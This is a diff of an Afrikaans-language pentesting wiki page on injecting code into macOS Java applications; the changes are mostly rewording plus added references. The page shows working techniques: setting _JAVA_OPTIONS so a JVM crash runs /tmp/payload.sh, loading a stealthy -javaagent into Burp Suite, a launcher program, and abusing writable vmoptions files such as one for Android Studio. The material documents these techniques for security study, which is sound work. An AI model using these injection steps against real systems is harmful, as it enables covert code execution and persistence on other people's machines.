@@ -1,10 +1,10 @@
-# macOS Java-toepassings-inspuiting
+# macOS Java Applications Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Enumerasie
 
-Vind Java-toepassings wat op jou stelsel geïnstalleer is. Daar is opgemerk dat Java-toepassings in die **Info.plist** sommige Java-parameters sal bevat wat die string **`java.`** bevat, dus kan jy daarvoor soek:
+Vind Java-toepassings wat op jou stelsel geïnstalleer is. Daar is opgemerk dat Java-toepassings in die **Info.plist** sommige Java-parameters sal bevat wat die string **`java.`** bevat, sodat jy daarvoor kan soek:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Die omgewingsveranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre Java-parameters in die uitvoering van 'n Java-gekompileerde toepassing in te spuit:
+Die omgewingsveranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre Java VM-parameters in te spuit wanneer ’n Java-toepassing begin.<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Om dit as 'n nuwe proses uit te voer en nie as 'n child process van die huidige terminal nie, kan jy gebruik:
+Om dit as ’n nuwe proses uit te voer en nie as ’n child van die huidige terminal nie, kan jy gebruik:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Dit sal egter 'n fout in die uitgevoerde toepassing veroorsaak; 'n meer stealthy manier is om 'n java agent te skep en die volgende te gebruik:
+Daardie tegniek veroorsaak egter ’n fout in die toepassing wat uitgevoer word. ’n Meer stealthy alternatief is om ’n Java agent te skep en `-javaagent` te gebruik:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,7 +83,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Die skep van die agent met ’n **ander Java-weergawe** as dié van die toepassing kan die uitvoering van beide die agent en die toepassing laat omval
+> Deur die agent met ’n **ander Java-weergawe** as dié van die toepassing te skep, kan beide die agent en die toepassing omval.
 
 Waar die agent kan wees:
 ```java:Agent.java
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-En exporteer dan die env-veranderlike en hardloop die java-toepassing soos volg:
+En exporteer dan die env-veranderlike en voer die java application soos volg uit:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions-lêer
+## vmoptions file
 
-Hierdie lêer ondersteun die spesifikasie van **Java params** wanneer Java uitgevoer word. Jy kan sommige van die vorige truuks gebruik om die java params te verander en **die proses arbitrêre opdragte te laat uitvoer**.\
-Boonop kan hierdie lêer ook **ander lêers insluit** met die `include`-gids, sodat jy ook ’n ingeslote lêer kan verander.
+Hierdie lêer ondersteun die spesifikasie van **Java parameters** wanneer Java uitgevoer word. Jy kan sommige van die vorige tegnieke gebruik om die Java parameters te verander en **die proses arbitrêre opdragte te laat uitvoer**.\
+Boonop kan hierdie lêer ook **ander lêers insluit** met die `include` directive, dus kan jy ook ’n ingeslote lêer verander.
 
-Verder sal sommige Java apps **meer as een `vmoptions`**-lêer laai.
+Nog meer, sommige Java-apps sal **meer as een `vmoptions`**-lêer **laai**.
 
-Sommige toepassings, soos Android Studio, dui in hul **output aan waar hulle na** hierdie lêers soek, soos:
+Sommige toepassings, soos Android Studio, dui in hul **uitvoer aan waar hulle** na hierdie lêers **soek**:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Sommige toepassings, soos Android Studio, dui in hul **output aan waar hulle na*
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-As hulle dit nie doen nie, kan jy dit maklik met die volgende nagaan:
+Indien hulle dit nie doen nie, kan jy met die volgende daarvoor kyk:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Let op hoe interessant dit is dat Android Studio in hierdie voorbeeld probeer om die lêer **`/Applications/Android Studio.app.vmoptions`** te laai, ’n plek waar enige gebruiker in die **`admin`-groep skryftoegang het.**
+Let daarop dat Android Studio in hierdie voorbeeld probeer om **`/Applications/Android Studio.app.vmoptions`** te laai, ’n ligging waar enige gebruiker in die **`admin`-groep skryftoegang het**.
 
+## References
+
+- [1] [OpenJDK — ontleding van `_JAVA_OPTIONS` in `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — spesifikasie van die `java.lang.instrument`-pakket](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — Konfigurasie van JVM-opsies en platformeienskappe](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
